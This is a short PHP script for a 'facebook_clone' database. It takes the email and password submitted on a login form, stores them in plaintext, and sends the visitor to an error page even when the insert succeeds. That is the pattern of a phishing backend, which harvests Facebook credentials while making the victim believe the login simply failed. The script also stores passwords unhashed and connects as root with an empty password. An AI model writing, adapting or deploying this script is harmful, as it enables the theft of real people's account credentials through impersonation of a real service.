<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "facebook_clone";

$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
  header("Location: error.html");
  exit();
}

$email = $_POST['email'];
$pass = $_POST['password'];

if (!empty($email) && !empty($pass)) {
  $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
  $stmt->bind_param("ss", $email, $pass);
  if ($stmt->execute()){
    // Redirect to custom error page
    header("Location: error.php");
  }
  $stmt->close();
} else {
  header("Location: error.php");
}

$conn->close();
?>
